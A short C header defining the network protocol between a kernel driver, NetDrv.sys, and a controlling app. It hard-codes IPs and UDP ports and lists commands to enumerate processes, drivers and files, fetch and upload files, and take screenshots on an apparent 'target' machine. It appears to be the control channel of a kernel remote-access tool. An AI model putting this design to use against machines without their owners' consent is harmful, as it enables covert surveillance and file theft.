//
// Ioctl.h - shared network protocol constants between NetDrv.sys and user app.
//

#pragma once

// Network endpoints. Driver sends from NETDRV_DRIVER_IP to NETDRV_APP_IP.
// User app should be listening on UDP NETDRV_APP_IP:NETDRV_UDP_PORT before
// sending control commands to the driver.
#define NETDRV_DRIVER_IP_A      "192.168.1.179"
#define NETDRV_DRIVER_IP_W      L"192.168.1.179"
#define NETDRV_DRIVER_IP_B1     192
#define NETDRV_DRIVER_IP_B2     168
#define NETDRV_DRIVER_IP_B3     1
#define NETDRV_DRIVER_IP_B4     179

#define NETDRV_APP_IP_A         "192.168.1.180"
#define NETDRV_APP_IP_W         L"192.168.1.180"
#define NETDRV_APP_IP_B1        192
#define NETDRV_APP_IP_B2        168
#define NETDRV_APP_IP_B3        1
#define NETDRV_APP_IP_B4        180

#define NETDRV_UDP_PORT          9999
#define NETDRV_SCREEN_AGENT_PORT 9998

// Every UDP datagram from the driver starts with this ASCII header.
// The app validates it before parsing the protocol payload.
#define NETDRV_UDP_PACKET_MAGIC      "NDARK1|"
#define NETDRV_UDP_PACKET_MAGIC_LEN  7

// App -> driver control commands. The driver validates the same magic header
// before accepting these payloads on NETDRV_DRIVER_IP:NETDRV_UDP_PORT.
#define NETDRV_CMD_ENUM_PROCESS  "C|process\n"
#define NETDRV_CMD_ENUM_DRIVER   "C|driver\n"
#define NETDRV_CMD_ENUM_FILE     "C|file|"     // followed by UTF-8 path then '\n'
#define NETDRV_CMD_GET_FILE      "C|get|"      // C|get|<utf8Path>\n
#define NETDRV_CMD_PUT_BEGIN     "C|put|"      // C|put|<utf8Path>|<sizeHex>|<chunkSize>|<chunkCount>\n
#define NETDRV_CMD_PUT_END       "C|putend|"   // C|putend|<utf8Path>|<sizeHex>\n
#define NETDRV_CMD_STOP          "C|stop\n"
#define NETDRV_CMD_SCREENSHOT    "C|screenshot\n"

// Driver -> local target-side agent command (process enrichment + ping).
#define NETDRV_AGENT_CMD_PROCESS "A|process\n"
#define NETDRV_AGENT_CMD_PING    "A|ping\n"
